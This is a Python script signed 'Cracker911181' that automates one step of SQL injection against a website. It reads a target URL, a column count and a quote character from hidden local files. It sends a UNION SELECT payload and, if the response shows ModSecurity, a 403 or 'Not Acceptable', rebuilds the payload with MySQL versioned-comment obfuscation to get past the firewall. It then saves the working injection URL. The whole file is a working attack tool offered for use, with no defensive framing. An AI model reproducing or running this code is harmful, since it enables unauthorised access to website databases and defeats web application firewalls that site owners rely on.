# Coded by Cracker
# CRACKER911181
 

import requests
import sys

#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest

#######

print(blue+"\n\n[+]Checking and Bypassing Farewall & 403 Error\n"+yellow)
###### file open #######

clmn=open(".colomn.txt","r")
colmn=clmn.read()

url=open(".link.txt","r")
link=url.read()

smbl=open(".smbl.txt","r")
symbol=smbl.read()

####################

#####how much colomn#######

colomn=int(colmn)

unin=[ ]
now_clmn=1
for i in range(colomn):
	now_colomn=str(now_clmn)
	unin.append(now_colomn)
	
	now_clmn=now_clmn+1

uniion=(",".join(unin))
union=str(uniion)

#######################

smbl1=symbol[0]
smbl2=symbol[1:]

######################

union_opn=open(".union.txt","w")

######################

if smbl1=="'":
	real_link=str(link+smbl1+"+AND+0+UNION+SELECT+"+union+smbl2)
	
	
	resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
	
	if "Not Acceptable" in resp:
		real_link1=str(link+smbl1+"+AND+0+/*!50000UNION/**_**/*/+SELECT+"+union+smbl2)
		
		union_opn.write(real_link1)
		union_opn.close()
	
	elif "403" in resp:
		real_link2=str(link+smbl1+"+AND+0+/*!50000UNION*/+SELECT+"+union+smbl2)
		
		union_opn.write(real_link2)
		union_opn.close()
	
	else:
		
		
		union_opn.write(real_link)
		union_opn.close()


		
else:
	real_link=str(link+"+AND+0+UNION+SELECT+"+union+symbol)
	
	
	resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
	
	if "Mod_Security" in resp:
		real_link1=str(link+"+AND+0+/*!50000UNION/**_**/*/+SELECT+"+union+symbol)
		
		union_opn.write(real_link1)
		union_opn.close()
	
	elif "403" in resp:
		real_link2=str(link+"+AND+0+/*!50000UNION*/+SELECT+"+union+symbol)
		
		union_opn.write(real_link2)
		union_opn.close()
	
	else:
		
		union_opn.write(real_link)
		union_opn.close()